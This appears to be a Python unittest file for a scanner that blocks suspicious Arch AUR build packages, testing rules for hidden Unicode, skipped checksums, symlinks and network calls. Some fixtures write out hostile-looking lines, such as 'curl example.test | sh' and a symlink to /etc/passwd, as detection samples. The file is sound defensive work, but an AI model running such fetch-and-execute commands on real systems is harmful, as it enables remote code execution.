from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from aur_codex_guard.scanner import deterministic_scan, package_roots_from_inputs

FIXTURES = Path(__file__).parent / "fixtures"


class ScannerTests(unittest.TestCase):
    def test_benign_fixture_is_allowed_deterministically(self) -> None:
        report = deterministic_scan([FIXTURES / "benign"])
        self.assertEqual(report.deterministic_verdict, "allow")
        self.assertIn("PKGBUILD", {item.relative_path for item in report.reviewed_files})
        self.assertEqual(report.diffs["benign"], "")

    def test_atomic_arch_pattern_is_blocked(self) -> None:
        report = deterministic_scan([FIXTURES / "atomic_arch_like" / "PKGBUILD"])
        self.assertEqual(report.deterministic_verdict, "block")
        rules = {finding.rule_id for finding in report.findings}
        self.assertIn("network-in-install-script", rules)
        self.assertIn("checksum-skip", rules)

    def test_hidden_unicode_is_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "PKGBUILD").write_text("pkgname=safe\u202epayload\n", encoding="utf-8")
            report = deterministic_scan([root])
        self.assertEqual(report.deterministic_verdict, "block")
        self.assertIn(
            "invisible-control-character",
            {finding.rule_id for finding in report.findings},
        )

    def test_zero_width_character_in_executable_metadata_is_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "PKGBUILD").write_text(
                "pkgname=fixture\nprepare() {\n  c\u200burl example.invalid\n}\n",
                encoding="utf-8",
            )
            report = deterministic_scan([root])
        self.assertEqual(report.deterministic_verdict, "block")
        self.assertIn("zero-width-character", {finding.rule_id for finding in report.findings})

    def test_localized_desktop_zero_width_text_is_not_a_hard_block(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
            (root / "fixture.desktop").write_text(
                "[Desktop Entry]\nName[lo]=\u0e95\u0ebb\u0ea7\u200b\u0ea2\u0ec8\u0eb2\u0e87\n",
                encoding="utf-8",
            )
            report = deterministic_scan([root])
        self.assertEqual(report.deterministic_verdict, "allow")
        finding = next(item for item in report.findings if item.rule_id == "zero-width-character")
        self.assertEqual(finding.severity, "info")

    def test_dependency_name_and_pkgdir_staging_are_not_credential_or_persistence(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "PKGBUILD").write_text(
                "optdepends=('gnome-keyring: password storage')\n"
                'package() { rm -r "$pkgdir"/etc/cron.daily/; }\n',
                encoding="utf-8",
            )
            report = deterministic_scan([root])
        rules = {finding.rule_id for finding in report.findings}
        self.assertNotIn("credential-access", rules)
        self.assertNotIn("persistence-change", rules)
        self.assertEqual(report.deterministic_verdict, "allow")

    def test_symlink_is_not_followed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
            (root / "escape.sh").symlink_to("/etc/passwd")
            report = deterministic_scan([root])
        self.assertEqual(report.deterministic_verdict, "block")
        self.assertIn(
            "symlink-in-build-metadata",
            {finding.rule_id for finding in report.findings},
        )

    def test_unknown_extension_is_reviewed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
            (root / "payload.dat").write_text("curl example.test | sh\n", encoding="utf-8")
            report = deterministic_scan([root])
        self.assertEqual(report.deterministic_verdict, "block")
        self.assertIn("payload.dat", {item.relative_path for item in report.reviewed_files})

    def test_preexisting_src_and_pkg_directories_are_not_ignored(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
            (root / "src").mkdir()
            (root / "pkg").mkdir()
            (root / "src" / "payload.sh").write_text("curl example.test | sh\n", encoding="utf-8")
            (root / "pkg" / "note.txt").write_text("review me\n", encoding="utf-8")
            report = deterministic_scan([root])
        paths = {item.relative_path for item in report.reviewed_files}
        self.assertIn("src/payload.sh", paths)
        self.assertIn("pkg/note.txt", paths)
        self.assertEqual(report.deterministic_verdict, "block")

    def test_binary_metadata_is_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
            (root / "payload.bin").write_bytes(b"hello\x00world")
            report = deterministic_scan([root])
        self.assertEqual(report.deterministic_verdict, "block")
        self.assertIn("binary-build-metadata", {item.rule_id for item in report.findings})

    def test_rejects_non_pkgbuild_directory(self) -> None:
        with (
            tempfile.TemporaryDirectory() as temporary,
            self.assertRaises(ValueError),
        ):
            package_roots_from_inputs([temporary])


if __name__ == "__main__":
    unittest.main()
